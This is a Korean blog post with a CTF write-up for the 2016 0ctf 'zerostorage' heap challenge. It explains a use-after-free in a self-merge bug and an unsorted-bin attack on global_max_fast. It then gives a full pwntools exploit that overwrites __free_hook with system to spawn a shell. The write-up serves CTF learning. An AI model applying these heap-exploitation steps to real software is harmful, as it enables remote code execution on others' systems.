---
layout: post
title: "[2016 0ctf] zerostorage 풀이"
date: 2018-09-27 04:44
categories: "[Pwn]CTF"
tags: rotles98
---

>### Try our super secret storage service - ZeroStorage
### Notice: Latest Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel.
### 202.120.7.206 10101

hoyoyoyoyoyoyoyo

- - -
# 0x00. 분석

{: refdef: style="text-align: center;"}
![checksec](/img/2016_0ctf/zerostorage/01.png)
{: refdef}

으악

취약점은 `func_merge`에서 발생한다.

두 `entry`를 합치는 코드인데 코드 자체는 잘 짰으나 `from_entry`와 `to_entry`가 같은지 검사하지 않는다.

`realloc`을 하는데 `realloc`을 하고도 같은 `chunk`를 가리켜야 하니까 `len`은 `0x44`이하로 해야한다. 그럼 `free`를 하고도 `entry_list`엔 주소가 남아있어서 **uaf**가 발생한다.

나머진 귀찮다.

- - -
# 0x01. 공격 방법

`unsorted_bin_attack`을 하면 원하는 주소에 `main_arena+88`의 주소를 넣을 수 있다. 이게 `libc_leak` 정도만 쓰일 줄 알았는데 이 문제는 좀 띠용하게 사용했다.

`fastbin`의 범위는 `global_max_fast`보다 작은 크기라서 기본적으론 `0x80`인가 들어가있다. 그런데 `unsorted_bin_attack`으로 이 값을 정확히 어떤 값인진 몰라도 `main_arena+88`을 넣어버리면 거의 모든 `chunk`를 `fastbin` 마냥 사용할 수 있게 된다.

이 문제에서 할당받을 수 있는 최소 크기가 `0x90`이라 `small_bin`이었는데 이젠 `fastbin`이다.

그리고 `free_hook`를 뒤져보니까 `0x200`으로 인식하게 할 수 있는 데이터가 있어서 `0x200`짜리 `fastbin`으로 `fastbin_dup_into_stack`해서 `free_hook`를 덮었다.

- - -
# 0x02. 익스플로잇

```python
from pwn import *
#context.log_level = "debug"

HOST = "192.168.0.19"
#HOST = "202.120.7.206"
PORT = 4444
#PORT = 10101

s = remote(HOST, PORT)
pause()

elf = ELF("./zerostorage")
libc = ELF("./libc.so.6")

libc_off = 0x3c4b78
system_off = libc.symbols["system"]
free_hook_off = 0x3c67a8
global_max_fast_off = 0x3c67f8

def func_insert(content):
    s.recvuntil("Your choice: ")
    s.sendline("1")

    s.recvuntil("Length of new entry: ")
    s.sendline(str(len(content)))

    s.recvuntil("Enter your data: ")
    s.send(content)

def func_update(index, content):
    s.recvuntil("Your choice: ")
    s.sendline("2")

    s.recvuntil("Entry ID: ")
    s.sendline(str(index))

    s.recvuntil("Length of entry:")
    s.sendline(str(len(content)))

    s.recvuntil("Enter your data: ")
    s.send(content)

def func_merge(from_index, to_index):
    s.recvuntil("Your choice: ")
    s.sendline("3")

    s.recvuntil("Merge from Entry ID: ")
    s.sendline(str(from_index))

    s.recvuntil("Merge to Entry ID: ")
    s.sendline(str(to_index))

def func_delete(index):
    s.recvuntil("Your choice: ")
    s.sendline("4")

    s.recvuntil("Entry ID: ")
    s.sendline(str(index))

def func_view(index):
    s.recvuntil("Your choice: ")
    s.sendline("5")

    s.recvuntil("Entry ID: ")
    s.sendline(str(index))

    s.recvuntil("\n")

func_insert("A" * 0x44) # 0
func_insert("A" * 0xfc) # 1

func_merge(0, 0) # 0 -> 2

func_view(2)
libc_leak = u64(s.recv(8))
s.recvuntil("\n")

libc_base = libc_leak - libc_off
libc_system = libc_base + system_off
libc_free_hook = libc_base + free_hook_off
global_max_fast = libc_base + global_max_fast_off

print
log.info("libc_base : " + hex(libc_base))
log.info("libc_free_hook : " + hex(libc_free_hook))
log.info("libc_system : " + hex(libc_system))
log.info("global_max_fast : " + hex(global_max_fast))
print

func_update(2, ("A" * 0x8 + p64(global_max_fast - 0x10)).ljust(0x88, "A")) # unsorted_bin_attack
func_insert("/bin/sh\0".ljust(0x88, "A")) # 0

func_merge(1, 1) # 1 -> 3
func_update(3, p64(libc_free_hook - 0x59).ljust(0x1f8, "A"))

func_insert("A" * 0x1f8) # 1
func_insert(("\x00" * 0x49 + p64(libc_system)).ljust(0x1f8, "\x00"))

func_delete(0) # system("/bin/sh")

s.interactive()
```
